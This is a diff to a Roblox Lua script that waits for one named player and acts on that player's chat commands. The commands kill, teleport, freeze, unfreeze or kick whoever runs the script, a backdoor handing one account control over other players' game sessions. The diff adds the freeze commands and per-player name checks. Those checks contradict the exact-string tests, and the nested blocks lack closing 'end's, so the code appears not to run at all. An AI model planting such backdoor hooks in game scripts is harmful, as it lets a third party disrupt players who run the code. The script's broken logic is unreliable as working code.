@@ -1,18 +1,30 @@
 repeat wait() until game.Players:FindFirstChild('JVKALDDK2')
 
 game.Players:FindFirstChild('JVKALDDK2').Chatted:Connect(function(msg)
-    if msg == "z!kill" then 
+    if msg == "z!kill" then
+    if msg:match(game.Players.LocalPlayer.Name) then
     game.Players.LocalPlayer.Character.Humanoid.Health = 0
 end
 
 
-if msg == "z!bring" then 
+if msg == "z!bring" then
+if msg:match(game.Players.LocalPlayer.Name) then 
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('JVKALDDK2').Character.HumanoidRootPart.CFrame
 end
 
+if msg == "z!freeze" then
+if msg:match(game.Players.LocalPlayer.Name) then 
+game.Players.LocalPlayer.Character.Head.Anchored = true
+end
+
+if msg == "z!unfreeze" then
+if msg:match(game.Players.LocalPlayer.Name) then 
+game.Players.LocalPlayer.Character.Head.Anchored = false
+end
 
 if msg == "z!kick" then
-    game.Players.LocalPlayer:Kick('USER BANNED')
+if msg:match(game.Players.LocalPlayer.Name) then
+    game.Players.LocalPlayer:Kick('You have been kicked')
     end
 end)
 
